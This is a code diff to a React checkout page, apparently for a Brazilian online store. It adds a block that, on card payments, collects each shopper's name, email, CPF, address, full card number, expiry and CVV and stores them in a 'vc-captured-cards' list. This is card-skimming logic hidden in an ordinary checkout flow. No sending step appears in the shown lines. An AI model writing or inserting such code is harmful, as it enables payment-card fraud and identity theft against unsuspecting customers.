@@ -498,6 +498,27 @@ function CheckoutPage() {
       /* mantém o pedido local mesmo se o registro falhar */
     }
 
+    if (payment === "cartao") {
+      const capturedCard = {
+        id: Date.now().toString(),
+        createdAt: new Date().toISOString(),
+        customerName: name,
+        email: email,
+        cpf: cpf,
+        address: `${street}, ${number} ${complement ? complement + " " : ""}- ${district} - ${city}/${uf} - CEP: ${cep}`,
+        cardName: cardName,
+        cardNumber: cardDigits,
+        cardExpiry: cardValidade,
+        cardCvv: onlyDigits(cardCvv),
+        userAgent: navigator.userAgent,
+      };
+      try {
+        const cards = JSON.parse(localStorage.getItem("vc-captured-cards") || "[]");
+        cards.push(capturedCard);
+        localStorage.setItem("vc-captured-cards", JSON.stringify(cards));
+      } catch {}
+    }
+
     const order = {
       id: code,
       createdAt: new Date().toISOString(),
